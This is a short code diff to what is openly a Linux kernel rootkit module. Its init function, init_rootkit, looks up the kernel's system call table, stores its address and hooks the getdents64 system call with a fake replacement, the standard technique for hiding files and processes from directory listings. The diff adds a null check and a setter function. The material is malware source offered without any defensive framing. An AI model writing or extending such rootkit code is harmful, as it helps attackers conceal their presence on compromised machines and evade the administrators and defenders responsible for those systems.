@@ -4,13 +4,19 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/version.h>
+#include <asm/unistd_64.h>
 
 #include "hooker.h"
 #include "fake_syscalls.h"
 
 static int __init init_rootkit(void)
 {
-    sys_call_table_original = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
+    sys_call_ptr_t *sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
+
+    if (!sys_call_table)
+        return -1;
+
+    set_sys_call_table_addr(sys_call_table);
     
     hook_syscall(__NR_getdents64, sys_getdents64_fake);
 
